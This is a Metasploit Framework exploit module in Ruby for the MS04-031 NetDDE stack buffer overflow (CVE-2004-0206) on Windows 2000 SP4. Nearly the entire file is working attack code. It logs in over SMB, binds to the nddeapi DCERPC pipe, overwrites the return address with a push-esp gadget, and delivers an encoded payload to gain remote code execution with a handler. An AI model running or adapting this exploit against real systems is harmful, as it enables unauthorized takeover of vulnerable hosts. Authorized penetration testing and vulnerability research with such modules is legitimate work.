##
# $Id: ms04_031_netdde.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft NetDDE Service Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the NetDDE service, which is the
				precursor to the DCOM interface.  This exploit effects only operating systems
				released prior to Windows XP SP1 (2000 SP4, XP SP0). Despite Microsoft's claim
				that this vulnerability can be exploited without authentication, the NDDEAPI
				pipe is only accessible after successful authentication.
			},
			'Author'         => [ 'pusscat' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '2004-0206'],
					[ 'OSVDB', '10689'],
					[ 'BID', '11372'],
					[ 'MSB', 'MS04-031'],

				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'    => (0x600 - (133*4) - 4),
					'BadChars' => "\\/.:$\x00",       # \ / . : $ NULL
					'Prepend'  => 'A' * 8,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4', { 'Ret' => 0x77e56f43 } ],  # push esp, ret :)
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 12 2004'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (nddeapi)", 'nddeapi']),
			], self.class)
	end

	def exploit
		connect()
		smb_login()
		print_status("Trying target #{target.name}...")

		handle = dcerpc_handle('2f5f3220-c126-1076-b549-074d078619da', '1.2', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
		print_status("Binding to #{handle}")
		dcerpc_bind(handle)
		print_status("Bound to #{handle}")

		retOverWrite =
			'AA' + (NDR.long(target.ret) * 133) + payload.encoded

		overflowChunk =
			retOverWrite +
			NDR.long(0xCA7CA7) + # Mew. 3 bytes enter. 1 byte null.
			NDR.long(0x0)

		stubdata =
			NDR.UnicodeConformantVaryingStringPreBuilt(overflowChunk) +
			NDR.long(rand(0xFFFFFFFF))

		print_status('Calling the vulnerable function...')

		begin
			response = dcerpc.call(0xc, stubdata)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
		end

		handler
		disconnect
	end

end
